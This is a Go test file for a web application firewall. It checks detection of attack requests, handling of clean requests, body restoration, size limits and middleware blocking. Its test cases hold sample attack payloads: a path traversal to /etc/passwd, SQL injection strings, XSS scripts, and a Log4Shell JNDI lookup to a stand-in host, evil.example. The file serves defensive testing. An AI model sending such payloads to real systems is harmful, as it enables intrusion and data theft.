package waf

import (
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestInspectDetectsAttacks(t *testing.T) {
	tests := []struct {
		name      string
		req       func() *http.Request
		wantID    string
		wantLoc   Location
		wantField string
	}{
		{
			name:    "path traversal in path",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/static/..%2F..%2Fetc%2Fpasswd", nil) },
			wantID:  "PT-001",
			wantLoc: LocationPath,
		},
		{
			name: "sqli in query",
			req: func() *http.Request {
				return httptest.NewRequest("GET", "/items?id=1%20UNION%20SELECT%20password", nil)
			},
			wantID:  "SQLI-003",
			wantLoc: LocationQuery,
		},
		{
			name:    "sqli with plus and tabs in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/items?id=1+union%09%09select+1", nil) },
			wantID:  "SQLI-003",
			wantLoc: LocationQuery,
		},
		{
			name:    "double-encoded xss in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/search?q=%253Cscript%253Ealert(1)", nil) },
			wantID:  "XSS-001",
			wantLoc: LocationQuery,
		},
		{
			name: "log4shell in header",
			req: func() *http.Request {
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
				return r
			},
			wantID:    "JNDI-001",
			wantLoc:   LocationHeader,
			wantField: "User-Agent",
		},
		{
			name: "xss in form body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/comment", strings.NewReader("text=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"))
				r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return r
			},
			wantID:  "XSS-003",
			wantLoc: LocationBody,
		},
		{
			name: "sqli in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/login", strings.NewReader(`{"user":"admin' OR '1'='1"}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID:  "SQLI-001",
			wantLoc: LocationBody,
		},
	}

	in := NewInspector(DefaultSignatures, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID || m.Location != tc.wantLoc || m.Field != tc.wantField {
				t.Errorf("got %s at %s (%q), want %s at %s (%q)",
					m.Signature.ID, m.Location, m.Field, tc.wantID, tc.wantLoc, tc.wantField)
			}
		})
	}
}

func TestInspectAllowsCleanRequests(t *testing.T) {
	in := NewInspector(DefaultSignatures, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/", nil),
		httptest.NewRequest("GET", "/products/42?sort=price&order=desc", nil),
		httptest.NewRequest("GET", "/search?q=select+a+union+representative", nil),
		httptest.NewRequest("POST", "/api/users", strings.NewReader(`{"name":"Alice","bio":"I like Go."}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "*/*")
		r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
		}
	}
}

func TestInspectRestoresBody(t *testing.T) {
	in := NewInspector(DefaultSignatures, 0)
	r := httptest.NewRequest("POST", "/", strings.NewReader("hello"))
	if m, err := in.Inspect(r); err != nil || m != nil {
		t.Fatalf("Inspect = %v, %v", m, err)
	}
	b, _ := io.ReadAll(r.Body)
	if string(b) != "hello" {
		t.Errorf("body after inspection = %q, want %q", b, "hello")
	}
}

func TestInspectBodyTooLarge(t *testing.T) {
	in := NewInspector(DefaultSignatures, 8)
	r := httptest.NewRequest("POST", "/", strings.NewReader("0123456789"))
	r.ContentLength = -1 // simulate a chunked request with unknown length
	if _, err := in.Inspect(r); !errors.Is(err, ErrBodyTooLarge) {
		t.Errorf("err = %v, want ErrBodyTooLarge", err)
	}
}

func TestMiddleware(t *testing.T) {
	var reached bool
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached = true
		b, _ := io.ReadAll(r.Body)
		io.WriteString(w, string(b))
	})
	h := Middleware(next, NewInspector(DefaultSignatures, 16), nil)

	tests := []struct {
		name        string
		req         *http.Request
		wantStatus  int
		wantReached bool
	}{
		{"clean", httptest.NewRequest("POST", "/", strings.NewReader("ok")), http.StatusOK, true},
		{"attack", httptest.NewRequest("GET", "/?q=<script>", nil), http.StatusForbidden, false},
		{"too large", httptest.NewRequest("POST", "/", strings.NewReader(strings.Repeat("a", 17))), http.StatusRequestEntityTooLarge, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			reached = false
			rec := httptest.NewRecorder()
			h.ServeHTTP(rec, tc.req)
			if rec.Code != tc.wantStatus {
				t.Errorf("status = %d, want %d", rec.Code, tc.wantStatus)
			}
			if reached != tc.wantReached {
				t.Errorf("next reached = %v, want %v", reached, tc.wantReached)
			}
			if tc.wantReached && rec.Body.String() != "ok" {
				t.Errorf("forwarded body = %q, want %q", rec.Body.String(), "ok")
			}
		})
	}
}
